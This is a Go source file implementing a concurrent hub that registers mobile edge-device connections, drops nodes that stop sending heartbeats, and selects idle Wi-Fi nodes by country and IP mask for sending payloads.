// Package coordinator implements a high-concurrency network coordinator for
// routing traffic across millions of mobile edge devices.
package coordinator

import (
	"sync"
	"sync/atomic"
	"time"
)

const (
	// DefaultCleanupInterval drops silent sockets to free RAM under load.
	DefaultCleanupInterval = 45 * time.Second
	// DefaultSilentTimeout is how long a node may go without a heartbeat.
	DefaultSilentTimeout = 45 * time.Second
	// DefaultSendBuffer bounds per-node outbound queue depth.
	DefaultSendBuffer = 64
)

// NodeID uniquely identifies a mobile edge device.
type NodeID string

// ClientConn is an active mobile node connection held in the hub.
type ClientConn struct {
	ID       NodeID
	Country  string // ISO 3166-1 alpha-2
	IP       string // dotted IPv4 or IPv6 textual form
	OnWiFi   bool
	Idle     bool
	Battery  uint8
	LastSeen time.Time

	// Send is a buffered, non-blocking outbound channel for execution payloads.
	Send chan []byte

	closed atomic.Bool
}

// Close marks the connection closed and drains the send channel safely.
func (c *ClientConn) Close() {
	if c.closed.Swap(true) {
		return
	}
	close(c.Send)
}

// TrySend enqueues payload without blocking the caller event loop.
// Returns false if the connection is closed or the buffer is full.
func (c *ClientConn) TrySend(payload []byte) bool {
	if c.closed.Load() {
		return false
	}
	select {
	case c.Send <- payload:
		return true
	default:
		return false
	}
}

// Touch updates the last-seen heartbeat timestamp.
func (c *ClientConn) Touch() {
	c.LastSeen = time.Now().UTC()
}

// Hub is the central connection registry for active mobile nodes.
// All map access is guarded by RWMutex so thousands of goroutines can
// register, look up, or unregister concurrently without deadlock.
type Hub struct {
	mu      sync.RWMutex
	clients map[NodeID]*ClientConn

	cleanupEvery time.Duration
	silentAfter  time.Duration

	stopCleanup chan struct{}
	cleanupOnce sync.Once
	started     atomic.Bool

	// Optional Redis-backed state mirror for O(1) cluster lookups.
	store StateStore
}

// HubOption configures optional Hub behaviour.
type HubOption func(*Hub)

// WithCleanupInterval overrides the background silent-socket sweep period.
func WithCleanupInterval(d time.Duration) HubOption {
	return func(h *Hub) { h.cleanupEvery = d }
}

// WithSilentTimeout overrides how long a node may stay silent before drop.
func WithSilentTimeout(d time.Duration) HubOption {
	return func(h *Hub) { h.silentAfter = d }
}

// WithStateStore attaches a Redis Cluster (or compatible) state backend.
func WithStateStore(store StateStore) HubOption {
	return func(h *Hub) { h.store = store }
}

// NewHub creates an empty connection hub ready for concurrent use.
func NewHub(opts ...HubOption) *Hub {
	h := &Hub{
		clients:      make(map[NodeID]*ClientConn),
		cleanupEvery: DefaultCleanupInterval,
		silentAfter:  DefaultSilentTimeout,
		stopCleanup:  make(chan struct{}),
	}
	for _, opt := range opts {
		opt(h)
	}
	return h
}

// StartCleanup launches the automated ticker that drops silent sockets
// every cleanupEvery (default 45s) to reclaim server RAM under intense load.
func (h *Hub) StartCleanup() {
	if h.started.Swap(true) {
		return
	}
	go h.cleanupLoop()
}

// StopCleanup halts the background sweeper.
func (h *Hub) StopCleanup() {
	h.cleanupOnce.Do(func() {
		close(h.stopCleanup)
	})
}

func (h *Hub) cleanupLoop() {
	ticker := time.NewTicker(h.cleanupEvery)
	defer ticker.Stop()
	for {
		select {
		case <-h.stopCleanup:
			return
		case <-ticker.C:
			h.DropSilent(time.Now().UTC())
		}
	}
}

// Register inserts or replaces a client connection. Safe for concurrent use.
func (h *Hub) Register(c *ClientConn) {
	if c == nil || c.ID == "" {
		return
	}
	if c.Send == nil {
		c.Send = make(chan []byte, DefaultSendBuffer)
	}
	if c.LastSeen.IsZero() {
		c.LastSeen = time.Now().UTC()
	}

	h.mu.Lock()
	if old, ok := h.clients[c.ID]; ok && old != c {
		old.Close()
	}
	h.clients[c.ID] = c
	h.mu.Unlock()

	if h.store != nil {
		_ = h.store.PutNode(c)
	}
}

// Unregister removes a client and closes its send channel.
func (h *Hub) Unregister(id NodeID) {
	h.mu.Lock()
	c, ok := h.clients[id]
	if ok {
		delete(h.clients, id)
	}
	h.mu.Unlock()

	if ok {
		c.Close()
		if h.store != nil {
			_ = h.store.DeleteNode(id)
		}
	}
}

// Get returns a live connection by ID (read-locked).
func (h *Hub) Get(id NodeID) (*ClientConn, bool) {
	h.mu.RLock()
	c, ok := h.clients[id]
	h.mu.RUnlock()
	return c, ok
}

// Len returns the number of active connections.
func (h *Hub) Len() int {
	h.mu.RLock()
	n := len(h.clients)
	h.mu.RUnlock()
	return n
}

// Snapshot returns a shallow copy of all active clients for read-only scans.
func (h *Hub) Snapshot() []*ClientConn {
	h.mu.RLock()
	out := make([]*ClientConn, 0, len(h.clients))
	for _, c := range h.clients {
		out = append(out, c)
	}
	h.mu.RUnlock()
	return out
}

// UpdateFlags updates idle / Wi-Fi / battery / country without replacing the conn.
func (h *Hub) UpdateFlags(id NodeID, onWiFi, idle bool, battery uint8, country string) bool {
	h.mu.Lock()
	c, ok := h.clients[id]
	if !ok {
		h.mu.Unlock()
		return false
	}
	c.OnWiFi = onWiFi
	c.Idle = idle
	c.Battery = battery
	if country != "" {
		c.Country = country
	}
	c.Touch()
	h.mu.Unlock()

	if h.store != nil {
		_ = h.store.PutNode(c)
	}
	return true
}

// DropSilent removes connections that have not sent a heartbeat since cutoff.
// Returns the number of dropped nodes.
func (h *Hub) DropSilent(now time.Time) int {
	cutoff := now.Add(-h.silentAfter)
	var dropped []*ClientConn

	h.mu.Lock()
	for id, c := range h.clients {
		if c.LastSeen.Before(cutoff) {
			dropped = append(dropped, c)
			delete(h.clients, id)
		}
	}
	h.mu.Unlock()

	for _, c := range dropped {
		c.Close()
		if h.store != nil {
			_ = h.store.DeleteNode(c.ID)
		}
	}
	return len(dropped)
}

// MatchIdleWiFi returns idle, Wi-Fi-connected nodes matching country and optional IP mask.
// The slice is a snapshot; callers must not mutate hub state through it.
func (h *Hub) MatchIdleWiFi(country string, ipMask *IPMask) []*ClientConn {
	h.mu.RLock()
	defer h.mu.RUnlock()

	out := make([]*ClientConn, 0, 8)
	for _, c := range h.clients {
		if !c.Idle || !c.OnWiFi {
			continue
		}
		if c.closed.Load() {
			continue
		}
		if country != "" && !equalFoldASCII(c.Country, country) {
			continue
		}
		if ipMask != nil && !ipMask.Contains(c.IP) {
			continue
		}
		out = append(out, c)
	}
	return out
}

func equalFoldASCII(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'a' && ca <= 'z' {
			ca -= 'a' - 'A'
		}
		if cb >= 'a' && cb <= 'z' {
			cb -= 'a' - 'A'
		}
		if ca != cb {
			return false
		}
	}
	return true
}
